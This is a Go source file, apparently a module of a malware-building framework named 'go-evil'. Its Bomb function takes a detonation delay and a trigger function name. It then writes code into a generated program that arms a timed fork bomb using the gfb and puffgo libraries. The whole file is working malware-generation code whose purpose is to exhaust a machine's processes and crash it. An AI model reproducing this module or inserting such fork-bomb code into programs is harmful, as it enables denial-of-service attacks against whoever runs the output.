package fork

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// Input is an evil array, ${"time until detonation in ms", "execution function name"}$
func Bomb(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "fork_bomb"

	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Expected two values, but recieved %d", arr.Length()), "bombs.fork_bomb()")
	}

	time := arr.Get(0)

	time_i := tools.String_to_int(time)
	if time_i == -1 {
		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", time), "bombs.fork_bomb()")
	}

	executioner := arr.Get(1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(timer int){", function_call),
		"interval := time.Duration(timer) * time.Millisecond",
		fmt.Sprintf("el := puffgo.NewListener(&interval, %s)", executioner),
		"fb := fbomb.NewBomb(el)",
		"fb.Arm()",
		"}"})

	data_object.Add_go_import("github.com/ARaChn3/gfb")
	data_object.Add_go_import("github.com/ARaChn3/puffgo")
	data_object.Add_go_import("time")

	return []string{fmt.Sprintf("%s(%d)", function_call, time_i)}, structure.Send(data_object)

}
